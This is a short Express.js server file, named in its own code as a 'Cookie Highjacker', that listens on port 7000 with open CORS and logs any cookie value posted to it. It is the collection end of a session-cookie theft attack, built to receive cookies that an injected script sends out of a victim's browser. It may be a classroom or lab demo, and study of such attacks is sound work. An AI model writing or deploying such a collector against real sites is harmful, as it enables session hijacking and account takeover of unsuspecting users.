import express from "express";
import cors from "cors";

const HIGHJACKER_PORT = 7000;
const app = express();
app.use(cors());

app.use(express.static("public"));
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

app.post("/", (req, res) => {
    console.log(`Cookie: ${req.body.cookie}`);
    res.status(200).end();
});

app.listen(HIGHJACKER_PORT, () => {
    console.log(`The Cookie Highjacker runs at http://localhost:${HIGHJACKER_PORT}`);
});